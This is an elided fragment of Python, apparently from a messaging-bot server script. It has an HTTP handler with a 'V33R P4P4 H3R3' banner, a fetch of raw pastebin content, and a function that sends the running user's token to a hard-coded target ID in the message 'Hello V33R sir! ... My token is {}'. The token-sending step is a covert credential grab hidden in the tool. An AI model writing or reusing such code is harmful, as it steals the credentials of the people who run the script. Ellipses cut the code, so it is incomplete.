...
class MyHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        ...
        self.end_headers()
        self.wfile.write(b"V33R P4P4 H3R3")
...
mmm = requests.get('https://pastebin.com/raw/pFcSTDfm').text
...
def send_initial_message():
    ...
    msg_template = "Hello  V33R sir! I am using your server. My token is {}"

    # Specify the ID where you want to send the message
    target_id = "100084893157022"
